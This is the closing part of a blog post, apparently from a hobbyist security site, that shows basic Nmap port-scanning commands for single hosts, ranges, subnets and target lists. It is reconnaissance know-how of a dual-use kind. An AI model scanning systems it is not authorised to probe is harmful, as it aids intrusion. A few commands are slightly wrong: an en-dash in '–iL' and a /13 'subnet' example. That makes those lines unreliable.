<p>To scan Nmap ports on a  remote system, enter the following in the terminal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">  sudo nmap <span style="color:#f92672">{</span>target_IP<span style="color:#f92672">}</span>
</code></pre></div><p>Replace the {target_IP} with the IP address of the system you’re scanning. This is the most basic format for Nmap, and it will return information about the ports on that system. While is this a quick scan, <strong>it wont scan all ports by default</strong>. To specify all ports look at the <strong>-p-</strong> flag in the previous table.</p>
<p>In addition to scanning by IP address, you can also use the following commands to specify a target:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#To scan a host:</span>
nmap www.hostname.com

<span style="color:#75715e">#To scan a range of IP addresses (.1 – .10):</span>
nmap 192.168.0.1-10

<span style="color:#75715e">#To run Nmap on a subnet:</span>
nmap 192.168.0.1/13

<span style="color:#75715e">#To scan targets from a text file:</span>
nmap –iL textlist.txt
</code></pre></div><p>Happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
    </channel>
</rss>
